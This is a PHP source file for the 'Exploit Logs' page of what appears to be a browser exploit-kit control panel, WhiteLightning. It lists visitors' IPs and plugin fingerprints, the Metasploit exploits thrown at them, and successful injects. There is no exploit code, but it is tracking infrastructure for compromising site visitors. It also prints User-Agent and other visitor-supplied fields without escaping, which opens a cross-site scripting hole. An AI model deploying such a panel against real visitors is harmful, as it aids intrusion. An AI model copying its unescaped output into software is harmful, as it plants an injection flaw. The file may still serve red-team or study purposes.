<?php
	session_start();
	require_once ('includes/config.inc.php'); 
	
	if (isset($_SESSION['name'])) {
		require_once (MYSQL);	
	}else{
		header("Location: login.php");
	}
?>

<html lang="en">
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>WhiteLightning -> Logs</title>

    <!-- Bootstrap Core CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom CSS -->
    <link href="css/sb-admin.css" rel="stylesheet">
	<link href="css/tabs.css" rel="stylesheet">

    <!-- Custom Fonts -->
    <link href="font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

</head>
<body>
    <div id="wrapper">
        <?php include('outline.php'); ?>
        <div id="page-wrapper">

            <div class="container-fluid">

                <!-- Page Heading -->
                <div class="row">
                    <div class="col-lg-12">
                        <h1 class="page-header">
                            Exploit Logs
                        </h1>
                        <ol class="breadcrumb">
                            <li>
                                <i class="fa fa-dashboard"></i>  <a href="index.php">Dashboard</a>
                            </li>
                            <li class="active">
                                <i class="fa fa-edit"></i> Exploit Logs
                            </li>
                        </ol>
                    </div>
                </div>
                <!-- /.row -->

				<div class="tabs">
					<ul class="tab-links">
						<li class="active"><a href="#tab1">Site Hits</a></li>
						<li><a href="#tab2">Exploit Attempts</a></li>
						<li><a href="#tab3">Successful Injects</a></li>
					</ul>
				 
					<div class="tab-content">
						<div id="tab1" class="tab active">
							<div class="row">
								<div class="col-lg-12">
									<div class="table-responsive">
										<table class="table table-bordered table-hover table-striped">
											<thead>
												<tr>
													<th>Time</th>
													<th>Remote Address</th>
													<th>OS</th>
													<th>Browser</th>
													<th>Version</th>
													<th>UserAgent</th>
													<th>Applications</th>
												</tr>
											</thead>
											<tbody>
											<?php
												$q = "SELECT hit_id, CONCAT_WS(' ', php_date, php_time) AS php_date_time, php_remote_addr, php_http_referer, php_http_user_agent, ua_os_family, ua_os_version, ua_os_platform, ua_browser_wow64, ua_browser_name, ua_browser_version, pd_os, pd_br, pd_br_ver, pd_br_ver_full, me_mshtml_build, be_office, pd_reader, pd_flash, pd_java, pd_qt, pd_rp, pd_shock, pd_silver, pd_wmp, pd_vlc FROM hits ORDER BY php_date_time DESC";
												$r = @mysqli_query ($dbc, $q); 
												while ($row = mysqli_fetch_array($r, MYSQLI_ASSOC)) {
													echo '<tbody><tr><tr class="danger">
														  <td>'.$row['php_date_time'].'</td>
														  <td>'.$row['php_remote_addr'].'</td>
														  <td>'.$row['ua_os_family'].'</td>
														  <td>'.$row['ua_browser_name'].'</td>
														  <td>'.$row['ua_browser_version'].'</td>
														  <td>'.$row['php_http_user_agent'].'</td>';
													$app_info = '';
													if( !(strcmp( $row['me_mshtml_build'], "unknown") == 0) ){
														$app_info .= "mshtml: " . $row['me_mshtml_build'] . " | ";
													}
													if( !(strcmp( $row['be_office'], "unknown") == 0) ){
														$app_info .= "office: " . $row['be_office'] . " | ";
													}
													if( !(strcmp( $row['pd_reader'], "unknown") == 0) ){
														$app_info .= "reader: " . $row['pd_reader'] . " | ";
													}
													if( !(strcmp( $row['pd_flash'], "unknown") == 0) ){
														$app_info .= "flash: " . $row['pd_flash'] . " | ";
													}
													if( !(strcmp( $row['pd_java'], "unknown") == 0) ){
														$app_info .= "java: " . $row['pd_java'] . " | ";
													}
													if( !(strcmp( $row['pd_qt'], "unknown") == 0) ){
														$app_info .= "qt: " . $row['pd_qt'] . " | ";
													}
													if( !(strcmp( $row['pd_rp'], "unknown") == 0) ){
														$app_info .= "rp: " . $row['pd_rp'] . " | ";
													}
													if( !(strcmp( $row['pd_shock'], "unknown") == 0 )){
														$app_info .= "shock: " . $row['pd_shock'] . " | ";
													}
													if( !(strcmp( $row['pd_silver'], "unknown") == 0) ){
														$app_info .= "silver: " . $row['pd_silver'] . " | ";
													}
													if( !(strcmp( $row['pd_wmp'], "unknown") == 0) ){
														$app_info .= "wmp: " . $row['pd_wmp'] . " | ";
													}
													if( !(strcmp( $row['pd_vlc'], "unknown") == 0) ){
														$app_info .= "vlc: " . $row['pd_vlc'] . " | ";
													}
													echo '<td>'.$app_info.'</td></tr>';
												}
											?>
											</tbody>
										</table>
									</div>
								</div>
							</div>
						</div>
						<div id="tab2" class="tab">
							<div class="row">
								<div class="col-lg-6">
									<div class="table-responsive">
										<table class="table table-bordered table-hover table-striped">
											<thead>
												<tr>
													<th>Time</th>
													<th>Hit ID</th>
													<th>Exploit Name</th>
													<th>Target Number</th>
												</tr>
											</thead>
											<tbody>
											<?php
												$q = "SELECT throw_id, CONCAT_WS(' ', php_date, php_time) AS php_date_time, hit_id, msf_exploit_full_path, msf_target FROM throws ORDER BY php_date_time DESC";
												$r = @mysqli_query ($dbc, $q); // Run the query.
												while ($row = mysqli_fetch_array($r, MYSQLI_ASSOC)) {
													echo '<tr><tr class="warning">
														  <td>'.$row['php_date_time'].'</td>
														  <td>'.$row['hit_id'].'</td>
														  <td>'.$row['msf_exploit_full_path'].'</td>
														  <td>'.$row['msf_target'].'</td></tr>';
												}
											?>
											</tbody>
										</table>
									</div>
								</div>
							</div>
						</div>
						<div id="tab3" class="tab">
							<div class="row">
								<div class="col-lg-4">
									<div class="table-responsive">
										<table class="table table-bordered table-hover table-striped">
											<thead>
												<tr>
													<th>Time</th>
													<th>Throw ID</th>
													<th>Remote Address</th>
												</tr>
											</thead>
											<tbody>
											<?php
												$q = "SELECT load_id, CONCAT_WS(' ', php_date, php_time) AS php_date_time, throw_id, php_remote_addr, php_http_referer, php_http_user_agent FROM loads ORDER BY php_date_time DESC";
												$r = @mysqli_query ($dbc, $q); // Run the query.
												while ($row = mysqli_fetch_array($r, MYSQLI_ASSOC)) {
													echo '<tr><tr class="success">
													      <td>'.$row['php_date_time'].'</td>
														  <td>'.$row['throw_id'].'</td>
														  <td>'.$row['php_remote_addr'].'</td></tr>';
												}
											?>
											</tbody>
										</table>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
            </div>
            <!-- /.container-fluid -->
        </div>
        <!-- /#page-wrapper -->
    </div>
    <!-- /#wrapper -->

    <!-- jQuery -->
    <script src="js/jquery.js"></script>
    <script src="js/tabs.js"></script>

    <!-- Bootstrap Core JavaScript -->
    <script src="js/bootstrap.min.js"></script>

</body>

</html>
